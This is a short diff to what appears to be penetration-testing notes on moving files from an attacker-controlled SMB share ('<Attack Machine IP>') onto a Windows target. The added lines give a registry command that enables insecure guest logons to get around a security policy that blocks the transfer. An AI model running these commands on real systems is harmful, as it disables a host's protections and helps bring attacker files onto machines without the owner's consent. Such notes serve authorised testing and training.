@@ -36,3 +36,9 @@ net use n: \\<Attack Machine IP>\share /user:<username>
 copy \\<Attack Machine IP>\share\<filename to download from Attack Machine>
 ```
 
+- If its saying the transfer is getting blocked because of the following reason  `You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.` execute the below command and then retry the `copy` command.
+##### ENABLE INSECURE LOGONS
+
+```cmd
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f
+```
